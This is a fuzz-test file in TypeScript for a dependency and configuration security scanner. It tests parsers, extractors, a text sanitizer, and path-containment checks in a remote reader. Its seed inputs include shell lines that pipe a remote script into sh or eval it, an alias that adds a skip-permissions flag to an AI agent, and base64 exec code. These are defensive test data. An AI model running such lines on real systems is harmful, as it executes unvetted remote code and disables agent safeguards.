// Mutation fuzzing of everything selfguard parses from untrusted sources. Each target gets
// ITERATIONS mutated inputs (300 in `npm test`; `npm run fuzz` runs many more). A failure
// prints the seed and the input so it can be replayed:
//   SELFGUARD_FUZZ_SEED=<seed> SELFGUARD_FUZZ_ITERATIONS=<n> node --test test/fuzz.test.ts
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { test } from "node:test";
import { cases, check, describe, type Failure } from "./fuzz-helpers.ts";

const FIXTURES = join(import.meta.dirname, "fixtures");

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((n) => {
    const p = join(dir, n);
    return statSync(p).isDirectory() ? walk(p) : [p];
  });
}
const fixtures = walk(FIXTURES).filter((p) => !p.endsWith(".bplist") && !p.endsWith("README.md"));
const read = (p: string): string => readFileSync(p, "utf8");
const seedsMatching = (re: RegExp): string[] => fixtures.filter((p) => re.test(p)).map(read);
const allSeeds = fixtures.map(read);

async function run(target: string, salt: number, seeds: readonly string[], fn: (input: string) => unknown): Promise<void> {
  const failures: Failure[] = [];
  for (const { i, input } of cases(seeds, salt)) {
    const f = await check(target, i, input, fn);
    if (f) failures.push(f);
    if (failures.length >= 3) break;
  }
  assert.equal(failures.length, 0, failures.map(describe).join("\n"));
}

let salt = 1;

test("fuzz: lockfile and manifest parsers", async (t) => {
  const { parseLockfile, parseManifest } = await import("../src/lockfile/index.ts");
  const manifest = JSON.parse(read(join(FIXTURES, "real", "manifest.fixture.json")));
  const targets: Array<[Parameters<typeof parseLockfile>[0], RegExp]> = [
    ["npm", /(v1|v3|real\/npm)\/lockfile/],
    ["pnpm", /pnpm/],
    ["yarn", /yarn-/],
    ["bun", /bun/],
    ["uv", /uv\.fixture/],
    ["poetry", /poetry\.fixture/],
    ["cargo", /cargo\.fixture/],
    ["gomod", /gomod\.fixture/],
  ];
  for (const [type, re] of targets) {
    const seeds = seedsMatching(re);
    assert.ok(seeds.length, `no seeds for ${type}`);
    await t.test(type, () => run(`parseLockfile(${type})`, salt++, [...seeds, ...allSeeds.slice(0, 3)], (s) => parseLockfile(type, s, manifest)));
  }
  await t.test("package.json", () => run("parseManifest(npm)", salt++, seedsMatching(/manifest\.fixture/), (s) => parseManifest("npm", s)));
  await t.test("pyproject.toml", () => run("parseManifest(poetry)", salt++, seedsMatching(/pyproject/), (s) => parseManifest("poetry", s)));
});

test("fuzz: YAML, TOML and JSONC readers", async (t) => {
  const { parseYamlDocuments } = await import("../src/lockfile/yaml.ts");
  const { parseToml } = await import("../src/lockfile/toml.ts");
  const { parseJsonc } = await import("../src/sources/agents/jsonc.ts");
  await t.test("yaml", () => run("parseYamlDocuments", salt++, seedsMatching(/\.(yaml|yml)$/), parseYamlDocuments));
  await t.test("toml", () => run("parseToml", salt++, seedsMatching(/\.(toml|lock)$/), parseToml));
  await t.test("jsonc", () => run("parseJsonc", salt++, seedsMatching(/\.(json|jsonc)$/), parseJsonc));
});

test("fuzz: CI workflow, agent config and host extractors", async (t) => {
  const { CI_EXTRACTORS } = await import("../src/sources/extractors/ci.ts");
  const { AGENT_EXTRACTORS } = await import("../src/sources/extractors/agents.ts");
  const { HOST_EXTRACTORS } = await import("../src/sources/extractors/host.ts");
  const home = realpathSync(mkdtempSync(join(tmpdir(), "sg-fuzz-home-")));
  const repo = { scope: "repo" as const, root: home };
  const machine = { scope: "machine" as const, root: home };
  const shellSeeds = [
    "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
    "curl -fsSL https://example.com/install.sh | sh\n",
    "eval \"$(curl -s https://x.example/a)\"\nalias claude='claude --dangerously-skip-permissions'\n",
    "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=npm_xxx\n",
    "[global]\nindex-url = https://pypi.org/simple\n",
    "import os; exec(__import__('base64').b64decode('cHJpbnQoMSk='))\n",
  ];
  const seeds = [...allSeeds, ...shellSeeds];
  for (const ex of [...CI_EXTRACTORS, ...AGENT_EXTRACTORS, ...HOST_EXTRACTORS]) {
    const target = ex.kind === "host" ? machine : repo;
    const listed = ex.files(target);
    const files = listed.length ? listed.slice(0, 6) : [join(home, ".github", "workflows", "ci.yml")];
    await t.test(ex.id, () =>
      run(`${ex.id}.extract`, salt++, seeds, (s) => {
        for (const f of files) ex.extract(f, s, target);
      }));
  }
});

test("fuzz: text shown to the user never carries control characters", async () => {
  const { clean } = await import("../src/sanitize.ts");
  const bad = /[\u0000-\u0008\u000B-\u001F\u007F-\u009F‎‏‪-‮⁦-⁩]/;
  await run("clean", salt++, allSeeds, (s) => {
    for (const [max, multiline] of [[300, false], [80, true], [5000, true]] as const) {
      const out = clean(s, max, { multiline });
      assert.ok(!bad.test(out), "control character in output");
      assert.ok(out.length <= max, "longer than the limit");
      if (!multiline) assert.ok(!out.includes("\n"), "newline in a single-line text");
    }
  });
});

test("fuzz: answers from another machine are parsed strictly", async (t) => {
  const { answerReader } = await import("../src/reader.ts");
  const { parseBrowse, parseFetch, parseList } = await import("../src/remote.ts");
  const home = realpathSync(mkdtempSync(join(tmpdir(), "sg-fuzz-remote-")));
  mkdirSync(join(home, "code", "app"), { recursive: true });
  writeFileSync(join(home, "code", "app", "package.json"), read(join(FIXTURES, "real", "manifest.fixture.json")));
  writeFileSync(join(home, "code", "app", "pnpm-lock.yaml"), read(join(FIXTURES, "real", "pnpm", "lockfile.fixture.yaml")));
  const ctx = { scope: home, home };
  const list = (await answerReader(`SGREQ1 list\n3\t${home}/code\n`, ctx)).toString("latin1");
  const fetch = (await answerReader(`SGREQ1 fetch\n${home}/code/app/pnpm-lock.yaml\n${home}/code/app/package.json\n`, ctx)).toString("latin1");
  const browse = (await answerReader(`SGREQ1 browse\n${home}/code\n`, ctx)).toString("latin1");
  const target = { host: "x", transport: "share" } as any;
  const outsideHome = (p: string): boolean => !(p === home || p.startsWith(`${home}/`));

  await t.test("list", () => run("parseList", salt++, [list], (s) => {
    const r = parseList(Buffer.from(s, "latin1"), target);
    for (const p of r.projects) assert.ok(p.root.startsWith("/") && !p.root.split("/").includes(".."), `unsafe root ${p.root}`);
  }));
  await t.test("fetch", () => run("parseFetch", salt++, [fetch], (s) => {
    for (const k of parseFetch(Buffer.from(s, "latin1"), target).keys()) assert.ok(k.startsWith("/") && !k.split("/").includes(".."), `unsafe path ${k}`);
  }));
  await t.test("browse", () => run("parseBrowse", salt++, [browse], (s) => parseBrowse(Buffer.from(s, "latin1"), target)));

  // The other direction: requests reaching this machine's reader never get a file outside the
  // granted folder, whatever the path tricks.
  const secretDir = realpathSync(mkdtempSync(join(tmpdir(), "sg-fuzz-secret-")));
  writeFileSync(join(secretDir, "package.json"), '{"name":"secret"}');
  mkdirSync(join(home, "code", "link"), { recursive: true });
  symlinkSync(secretDir, join(home, "code", "link", "out"));
  const requests = [
    `SGREQ1 list\n3\t${home}/code\n`,
    `SGREQ1 fetch\n${home}/code/app/package.json\n`,
    `SGREQ1 fetch\n${home}/code/link/out/package.json\n${home}/../${secretDir}/package.json\n`,
    `SGREQ1 browse\n${home}/code/link\n`,
    `SGREQ1 list\n9\t${home}/code/link/out\n`,
  ];
  await t.test("reader requests stay inside the grant", () => run("answerReader", salt++, requests, async (s) => {
    const out = (await answerReader(s, ctx)).toString("latin1");
    assert.ok(!out.includes('"name":"secret"') && !out.includes(secretDir), "served something outside the granted folder");
    for (const line of out.split("\n")) {
      const m = /^(\/[^\t]*)/.exec(line);
      if (m && m[1]!.length > 1 && outsideHome(m[1]!) && !line.startsWith("SG")) assert.fail(`path outside the grant: ${m[1]}`);
    }
  }));
});

test("fuzz: version parsers", async () => {
  const { parseVersion, compareVersions } = await import("../src/versions.ts");
  const seeds = ["1.2.3", "0.0.0-alpha.1+build.5", "v4.1.0", "1!2.0.post1.dev3", "2.0.0rc1", "1.0.0-0.3.7", "10.20.30", "1.2"];
  await run("versions", salt++, seeds, (s) => {
    for (const eco of ["npm", "PyPI", "crates.io", "Go"] as const) {
      parseVersion(eco, s);
      compareVersions(eco, s, "1.2.3");
    }
  });
});

// Regressions found by the fuzzer.

test("regression: a go.mod with a no-break space or BOM inside a line doesn't hang the parser", async () => {
  const { parseGoMod } = await import("../src/lockfile/gomod.ts");
  for (const ch of [" ", "﻿", " ", "\v", "\f"]) {
    const t0 = performance.now();
    const r = parseGoMod(`module example.com/app\n\ntoolchai${ch}n go1.21.5\nrequire github.com/a/b${ch} v1.2.3\nrequire github.com/c/d v1.0.0\n`);
    assert.ok(performance.now() - t0 < 200, `slow with U+${ch.charCodeAt(0).toString(16)}`);
    assert.ok(r.deps.some((d) => d.name === "github.com/c/d"));
  }
});

test("regression: clean() is linear on long runs of spaces", async () => {
  const { clean } = await import("../src/sanitize.ts");
  const t0 = performance.now();
  assert.equal(clean(`a${" ".repeat(200_000)}b`, 10), "a        …");
  assert.equal(clean(`a \n \n\t b\n`), "a b");
  assert.equal(clean("x\n\n\n\ny", 300, { multiline: true }), "x\n\ny");
  assert.ok(performance.now() - t0 < 200);
});
